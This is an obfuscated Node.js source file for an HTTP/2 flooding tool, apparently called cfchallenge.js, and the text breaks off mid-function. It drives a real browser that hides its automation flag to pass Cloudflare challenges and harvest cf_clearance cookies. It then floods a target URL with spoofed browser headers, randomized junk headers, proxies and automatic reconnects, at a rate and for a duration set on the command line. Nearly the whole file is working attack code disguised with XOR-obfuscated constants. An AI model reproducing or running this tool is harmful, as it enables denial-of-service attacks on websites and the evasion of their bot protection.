const { connect } = require("puppeteer-real-browser");
let _0x85e25g;
const http2 = require("http2");
_0x85e25g = (248131 ^ 248132) + (919104 ^ 919108);
const tls = require("tls");
const cluster = require("cluster");
var _0x_0x063 = (135338 ^ 135337) + (909719 ^ 909716);
const url = require("url");
_0x_0x063 = (504875 ^ 504867) + (582232 ^ 582237);
const crypto = require("crypto");
let _0x3b2d1b;
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
_0x3b2d1b = (920179 ^ 920187) + (116477 ^ 116469);
const ciphers = "GREASE:" + [defaultCiphers[236384 ^ 236386], defaultCiphers[866727 ^ 866726], defaultCiphers[240944 ^ 240944], ...defaultCiphers.slice(408182 ^ 408181)].join(":");
var _0xa49dg = (226227 ^ 226229) + (582279 ^ 582279);
const sigalgs = ["rsa_pss_rsae_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256"];
_0xa49dg = 'fbbpcc';
const ecdhCurve = "X25519:P-256:P-384:P-521";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.ALPN_ENABLED | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE | crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT | crypto.constants.SSL_OP_COOKIE_EXCHANGE | crypto.constants.SSL_OP_PKCS1_CHECK_1 | crypto.constants.SSL_OP_PKCS1_CHECK_2 | crypto.constants.SSL_OP_SINGLE_DH_USE | crypto.constants.SSL_OP_SINGLE_ECDH_USE | crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
const secureProtocol = "TLS_method";
const secureContext = tls.createSecureContext({ ciphers: ciphers, sigalgs: sigalgs.join(":"), honorCipherOrder: true, secureOptions: secureOptions, secureProtocol: secureProtocol });
const accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"];
const cache_header = ["no-cache", "max-age=0", "no-cache, no-store, must-revalidate", "no-store", "no-cache, no-store, private, max-age=0"];
var _0x734b6e = (415701 ^ 415708) + (411549 ^ 411549);
const language_header = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7", "en-GB,en;q=0.9"];
_0x734b6e = 'pgjmmf';
if (process.argv.length < (249697 ^ 249703)) {
    console.log("\x1b[31mUsage: node cfchallenge.js <target> <time> <rate> <threads> <cookieCount> <proxies.txt>\x1b[0m");
    console.log("\x1b[33mExample: node cfchallenge.js https://example.com 60 5 4 6 proxies.txt\x1b[0m");
    process.exit(653421 ^ 653420);
}
let _0x136fa;
const args = {
    target: process.argv[472179 ^ 472177],
    time: parseInt(process.argv[408881 ^ 408882]),
    Rate: parseInt(process.argv[565672 ^ 565676]),
    threads: parseInt(process.argv[987111 ^ 987106]),
    cookieCount: parseInt(process.argv[835486 ^ 835480]) || (638730 ^ 638728)
};
_0x136fa = (321931 ^ 321932) + (378814 ^ 378814);
let _0x27bead;
const parsedTarget = url.parse(args.target);
_0x27bead = "mklmkl";

function flood(userAgent, cookie) {
    try {
        let _0x5f_0x27g;
        let _0x95d = url.parse(args.target);
        _0x5f_0x27g = 327605 ^ 327602;
        let _0xc448g;
        let _0xe4b = _0x95d.path;
        _0xc448g = 638311 ^ 638307;

        function _0xfg1a2c(min, max) {
            return Math.floor(Math.random() * (max - min + (314627 ^ 314626))) + min;
        }
        let _0x2444fg = _0xfg1a2c(255167 ^ 255195, 867396 ^ 868268);

        function _0x1a58e(userAgent, _0xb_0x7f3, _0x09e) {
            const _0x2b5a1e = new RegExp("Chrome/([0-9]+)", "");
            _0xb_0x7f3 = "kpgpbg";
            const _0xf_0x8c8 = userAgent.match(_0x2b5a1e);
            _0x09e = (739624 ^ 739628) + (320713 ^ 320713);
            if (_0xf_0x8c8 && _0xf_0x8c8[203729 ^ 203728]) {
                return _0xf_0x8c8[772862 ^ 772863];
            }
            return null;
        }
        let _0x69aeda;
        const _0xf63cb = _0x1a58e(userAgent) || "126";
        _0x69aeda = 'bbkmhf';
        var _0x765b = (275069 ^ 275066) + (772539 ^ 772541);
        const _0xd_0x8d7 = list => list[Math.floor(Math.random() * list.length)];
        _0x765b = 620194 ^ 620194;
        const _0x1735b = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9", "es-ES,es;q=0.9", "it-IT,it;q=0.9", "pt-BR,pt;q=0.9", "ja-JP,ja;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9", "ru-RU,ru;q=0.9", "ar-SA,ar;q=0.9", "hi-IN,hi;q=0.9", "ru-KP,ru;q=0.9", "tr-TR,tr;q=0.9", "id-ID,id;q=0.9", "nl-NL,nl;q=0.9", "sv-SE,sv;q=0.9", "no-NO,no;q=0.9", "da-DK,da;q=0.9", "fi-FI,fi;q=0.9", "pl-PL,pl;q=0.9", "cs-CZ,cs;q=0.9", "hu-HU,hu;q=0.9", "el-GR,el;q=0.9", "pt-PT,pt;q=0.9", "th-TH,th;q=0.9", "vi-VN,vi;q=0.9", "he-IL,he;q=0.9", "fa-IR,fa;q=0.9"];
        var _0x47f87f = (219898 ^ 219897) + (327481 ^ 327484);
        let _0xec4d = {
            ":method": "GET",
            ":authority": _0x95d.host,
            ":scheme": "https",
            ":path": _0xe4b,
            "user-agent": userAgent,
            "upgrade-insecure-requests": "1",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "cookie": cookie,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "sec-ch-ua": `"Chromium";v="${_0xf63cb}", "Not)A;Brand";v="8", "Chrome";v="${_0xf63cb}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept-encoding": "gzip, deflate, br, zstd",
            ...shuffleObject({
                "accept-language": _0xd_0x8d7(_0x1735b) + ",fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
                "purpure-secretf-id": "-formula" + generateRandomString(853208 ^ 853209, 890825 ^ 890827)
            }),
            "priority": "u=0, i",
            "te": "trailers"
        };
        _0x47f87f = (405327 ^ 405325) + (252387 ^ 252385);
        let _0x5_0x18e = {
            ...(Math.random() < 0.3 ? { "purpure-secretf-id": "-formula" + generateRandomString(885699 ^ 885698, 978375 ^ 978373) } : {}),
            ...(Math.random() < 0.5 ? { "sec-stake-fommunity": "bet-clc" } : {}),
            ...(Math.random() < 0.6 ? { [generateRandomString(161568 ^ 161569, 330358 ^ 330356) + "-SELF-DYNAMIC-" + generateRandomString(114874 ^ 114875, 442199 ^ 442197)]: "-zero" + generateRandomString(614200 ^ 614201, 109439 ^ 109437) } : {}),
            ...(Math.random() < 0.6 ? { ["stringclick-bad-" + generateRandomString(651019 ^ 651018, 658565 ^ 658567)]: "router-" + generateRandomString(552374 ^ 552375, 157282 ^ 157280) } : {}),
            ...(Math.random() < 0.6 ? { ["root-user" + generateRandomString(317907 ^ 317906, 911305 ^ 911307)]: "-root" + generateRandomString(428544 ^ 428545, 887720 ^ 887722) } : {}),
            ...(Math.random() < 0.6 ? { ["Java-script-" + generateRandomString(296396 ^ 296397, 840015 ^ 840013)]: "zero-" + generateRandomString(107665 ^ 107664, 367286 ^ 367284) } : {}),
            ...(Math.random() < 0.6 ? { ["HTTP-request-with-unusual-PATH-" + generateRandomString(310922 ^ 310923, 943389 ^ 943391)]: "router-" + generateRandomString(180457 ^ 180456, 753224 ^ 753226) } : {}),
            ...(Math.random() < 0.3 ? { [generateRandomString(941312 ^ 941313, 113300 ^ 113302) + "-C-Boost-" + generateRandomString(602191 ^ 602190, 987539 ^ 987537)]: "-zero" + generateRandomString(763992 ^ 763993, 603975 ^ 603973) } : {}),
            ...(Math.random() < 0.3 ? { ["sys-nodejs-" + generateRandomString(898573 ^ 898572, 257654 ^ 257652)]: "-router" + generateRandomString(335267 ^ 335266, 398606 ^ 398604) } : {})
        };
        let _0xd246ee = ["accept-language", "sec-fetch-user", "sec-ch-ua-platform", "accept", "sec-ch-ua", "sec-ch-ua-mobile", "accept-encoding", "purpure-secretf-id", "priority"];
        var _0x4e9g7b = (300820 ^ 300823) + (888565 ^ 888573);
        let _0x93a5f = Object.entries(_0xec4d);
        _0x4e9g7b = (667582 ^ 667578) + (895929 ^ 895935);
        var _0x648aa = (365450 ^ 365454) + (748407 ^ 748402);
        let _0x7f37c = Object.entries(_0x5_0x18e).sort(() => Math.random() - 0.5);
        _0x648aa = (213003 ^ 213000) + (845677 ^ 845677);
        _0x7f37c.forEach(([key, value]) => {
            let _0xe077dg = _0xd246ee[Math.floor(Math.random() * _0xd246ee.length)];
            let _0xe7ca = _0x93a5f.findIndex(([k, v]) => k === _0xe077dg);
            if (_0xe7ca !== -(955286 ^ 955287)) {
                _0x93a5f.splice(_0xe7ca + (594153 ^ 594152), 180083 ^ 180083, [key, value]);
            }
        });
        let _0xgf_0x49d = Object.fromEntries(_0x93a5f);
        var _0xc_0xcb3 = (729305 ^ 729297) + (462168 ^ 462168);
        const _0xcdg68a = [crypto.constants.SSL_OP_NO_RENEGOTIATION, crypto.constants.SSL_OP_NO_TICKET, crypto.constants.SSL_OP_NO_SSLv2, crypto.constants.SSL_OP_NO_SSLv3, crypto.constants.SSL_OP_NO_COMPRESSION, crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION, crypto.constants.SSL_OP_TLSEXT_PADDING, crypto.constants.SSL_OP_ALL];
        _0xc_0xcb3 = (402693 ^ 402689) + (817543 ^ 817541);

        function _0xf2334a(parsed, _0xe5ba) {
            const _0xa6b93a = tls.connect({
                host: parsed.host,
                port: 443,
                servername: parsed.host,
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                ALPNProtocols: ["h2"],
                rejectUnauthorized: false,
                sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
                ecdhCurve: "X25519:P-256:P-384",
                ...(Math.random() < 0.5 ? { secureOptions: _0xcdg68a[Math.floor(Math.random() * _0xcdg68a.length)] } : {})
            });
            _0xe5ba = 966490 ^ 966490;
            _0xa6b93a.setKeepAlive(true, 600000 * (754866 ^ 755546));
            return _0xa6b93a;
        }
        let _0x4gd;
        const tlsSocket = _0xf2334a(_0x95d);
        _0x4gd = (806639 ^ 806639) + (990794 ^ 990786);
        var _0x76g7ga = (325391 ^ 325391) + (881508 ^ 881509);
        const _0x061ge = http2.connect(_0x95d.href, {
            createConnection: () => tlsSocket,
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                NO_RFC7540_PRIORITIES: Math.random() < 0.5 ? true : "1"
            }
        }, session => {
            session.setLocalWindowSize(12517377 + (534508 ^ 579603));
        });
        _0x76g7ga = (862110 ^ 862102) + (856603 ^ 856605);
        _0x061ge.on("connect", () => {
            let _0x1fb;
            let _0x1e5b = setInterval(async () => {
                for (let i = 933310 ^ 933310; i < args.Rate; i++) {
                    const _0xffd4ed = _0x061ge.request({ ..._0xgf_0x49d }, { weight: Math.random() < 0.5 ? 786819 ^ 786857 : 147662 ^ 147918, depends_on: 0, exclusive: false });
                    _0xffd4ed.on("response", res => {
                        global.successRequests = (global.successRequests || 983331 ^ 983331) + (398246 ^ 398247);
                        global.totalRequests = (global.totalRequests || 150118 ^ 150118) + (821820 ^ 821821);
                        if (res[":status"] === (628005 ^ 627848)) {
                            _0x2444fg = 681379 ^ 666499;
                            _0x061ge.close();
                        }
                    });
                    _0xffd4ed.end();
                }
            }, _0x2444fg);
            _0x1fb = (909687 ^ 909680) + (870641 ^ 870647);
            let _0xaa1f = 298199 ^ 298199;
            _0x061ge.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                let _0xe_0x481 = Math.min((673789 ^ 672789) * Math.pow(600033 ^ 600035, _0xaa1f), 925059 ^ 927515);
                setTimeout(() => {
                    _0xaa1f++;
                    _0x061ge.destroy();
                    tlsSocket.destroy();
                    flood(userAgent, cookie);
                }, _0xe_0x481);
            });
            _0x061ge.on("close", () => {
                clearInterval(_0x1e5b);
                _0x061ge.destroy();
                tlsSocket.destroy();
                return flood(userAgent, cookie);
            });
            _0x061ge.on("error", error => {
                _0x061ge.destroy();
                tlsSocket.destroy();
                return flood(userAgent, cookie);
            });
        });
        _0x061ge.on("error", error => {
            _0x061ge.destroy();
            tlsSocket.destroy();
        });
    } catch (err) {
        console.log(`Error in flood function: ${err.message}`);
    }
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randstr(length, _0xa4d36g, _0x5ee) {
    var _0x6c_0x63c = (696493 ^ 696489) + (759519 ^ 759516);
    _0xa4d36g = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    _0x6c_0x63c = (360729 ^ 360729) + (788327 ^ 788324);
    var _0xc8d = (330883 ^ 330887) + (246293 ^ 246293);
    _0x5ee = "";
    _0xc8d = 356259 ^ 356258;
    for (let i = 625081 ^ 625081; i < length; i++) {
        _0x5ee += _0xa4d36g[Math.floor(Math.random() * _0xa4d36g.length)];
    }
    return _0x5ee;
}

function generateRandomString(minLength, maxLength, _0x2_0xc61, _0xc9e85d) {
    _0xc9e85d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    _0x2_0xc61 = 'gnnmhi';
    const _0x8987be = Math.floor(Math.random() * (maxLength - minLength + (390967 ^ 390966))) + minLength;
    const _0x50e73c = Array.from({ length: _0x8987be }, () => {
        var _0xae4c = (164358 ^ 164357) + (363330 ^ 363328);
        const _0x7a2d1e = Math.floor(Math.random() * _0xc9e85d.length);
        _0xae4c = (914225 ^ 914229) + (283826 ^ 283829);
        return _0xc9e85d[_0x7a2d1e];
    });
    return _0x50e73c.join('');
}

function shuffleObject(obj, _0x3_0x352, _0x4_0x6gf) {
    const _0x491be = Object.keys(obj);
    _0x3_0x352 = 'kkbdfg';
    const _0xb3_0xb86 = _0x491be.reduce((acc, _, index, array) => {
        var _0xgcb = (437664 ^ 437665) + (301979 ^ 301970);
        const _0x56eb = Math.floor(Math.random() * (index + (190052 ^ 190053)));
        _0xgcb = "knhhma";
        acc[index] = acc[_0x56eb];
        acc[_0x56eb] = _0x491be[index];
        return acc;
    }, []);
    _0x4_0x6gf = 'fgombf';
    const _0x6_0xd8a = Object.fromEntries(_0xb3_0xb86.map(key => [key, obj[key]]));
    return _0x6_0xd8a;
}

async function bypassCloudflareOnce(attemptNum = 277550 ^ 277551, _0xb2_0xd0g) {
    let _0xa79c = null;
    var _0x51a = (946217 ^ 946209) + (142745 ^ 142737);
    let _0xf6d = null;
    _0x51a = (871679 ^ 871673) + (898563 ^ 898571);
    let _0x2434c = null;
    _0xb2_0xd0g = (709159 ^ 709158) + (730299 ^ 730303);
    try {
        console.log(`\x1b[33mStarting bypass attempt ${attemptNum}...\x1b[0m`);
        _0xa79c = await connect({
            headless: false,
            args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage", "--disable-accelerated-2d-canvas", "--no-first-run", "--no-zygote", "--disable-gpu", "--window-size=1920,1080"],
            turnstile: true,
            connectOption: { defaultViewport: null }
        });
        _0xf6d = _0xa79c.browser;
        _0x2434c = _0xa79c.page;
        await _0x2434c.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, "webdriver", { get: () => undefined });
        });
        console.log(`\x1b[33mAccessing ${args.target}...\x1b[0m`);
        try {
            await _0x2434c.goto(args.target, { waitUntil: "domcontentloaded", timeout: 60000 });
        } catch (navError) {
            console.log(`\x1b[33mAccess warning: ${navError.message}\x1b[0m`);
        }
        console.log("\x1b[33mChecking Cloudflare challenge...\x1b[0m");
        var _0x41f84a = (556327 ^ 556320) + (669028 ^ 669025);
        let _0x1535dg = false;
        _0x41f84a = (448446 ^ 448446) + (725434 ^ 725436);
        var _0x6f8f1f = (461663 ^ 461657) + (971705 ^ 971711);
        let _0xbf_0x14b = 580797 ^ 580797;
        _0x6f8f1f = (587170 ^ 587169) + (352619 ^ 352619);
        const _0xfa615c = 200487 ^ 200543;
        while (!_0x1535dg && _0xbf_0x14b < _0xfa615c) {
            await new Promise(r => setTimeout(r, 263722 ^ 264158));
            try {
                const cookies = await _0x2434c.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                if (cfClearance) {
                    console.log(`\x1b[32mFound cookie after ${(_0xbf_0x14b * 0.5).toFixed(969669 ^ 969668)}s!\x1b[0m`);
                    _0x1535dg = true;
                    break;
                }
                _0x1535dg = await _0x2434c.evaluate(() => {
                    var _0xf066f = (912687 ^ 912680) + (378338 ^ 378336);
                    const _0xc9ae = (document.title || "").toLowerCase();
                    _0xf066f = (890738 ^ 890742) + (158753 ^ 158753);
                    var _0xc2440c = (345359 ^ 345353) + (564229 ^ 564229);
                    const _0x791a = (document.body?.innerText || "").toLowerCase();
                    _0xc2440c = 'mmqjod';
                    if (_0xc9ae.includes("just a moment") || _0xc9ae.includes("checking") || _0x791a.includes("checking your browser") || _0x791a.includes("please wait") || _0x791a.includes("cloudflare")) {
                        return false;
                    }
                    return document.body && document.body.children.length > (181003 ^ 181000);
                });
            } catch (evalError) { }
            _0xbf_0x14b++;
            if (_0xbf_0x14b % (637993 ^ 637987) === (229558 ^ 229558)) {
                console.log(`\x1b[33mStill checking... (${(_0xbf_0x14b * 0.5).toFixed(332771 ^ 332770)}s elapsed)\x1b[0m`);
            }
        }
        await new Promise(r => setTimeout(r, 609374 ^ 610230));
        let _0x1bb88a;
        const cookies = await _0x2434c.cookies();
        _0x1bb88a = 'donmpb';
        console.log(`\x1b[36mFound ${cookies.length} cookies in ${(_0xbf_0x14b * 0.5).toFixed(657454 ^ 657455)}s\x1b[0m`);
        var _0xa55c = (356176 ^ 356176) + (221030 ^ 221025);
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        _0xa55c = (866379 ^ 866376) + (128956 ^ 128958);
        if (cfClearance) {
            console.log(`\x1b[32mcf_clearance: ${cfClearance.value.substring(237855 ^ 237855, 366231 ^ 366217)}...\x1b[0m`);
        }
        const _0x2265fb = await _0x2434c.evaluate(() => navigator.userAgent);
        await _0x2434c.close();
        await _0xf6d.close();
        return {
            cookies: cookies,
            userAgent: _0x2265fb,
            cfClearance: cfClearance ? cfClearance.value : null,
            success: true,
            attemptNum: attemptNum
        };
    } catch (error) {
        console.log(`\x1b[31mBypass attempt ${attemptNum} failed: ${error.message}\x1b[0m`);
        try {
            if (_0x2434c) await _0x2434c.close();
            if (_0xf6d) await _0xf6d.close();
        } catch (cleanupError) { }
        return {
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: false,
            attemptNum: attemptNum
        };
    }
}

async function bypassCloudflareParallel(totalCount, _0xe2be8c, _0x2gdbfb) {
    console.log("\x1b[35mCLOUDFLARE BYPASS - PARALLEL MODE\x1b[0m");
    console.log(`\x1b[36mTarget cookie count: ${totalCount}\x1b[0m`);
    var _0xa70db = (810483 ^ 810480)
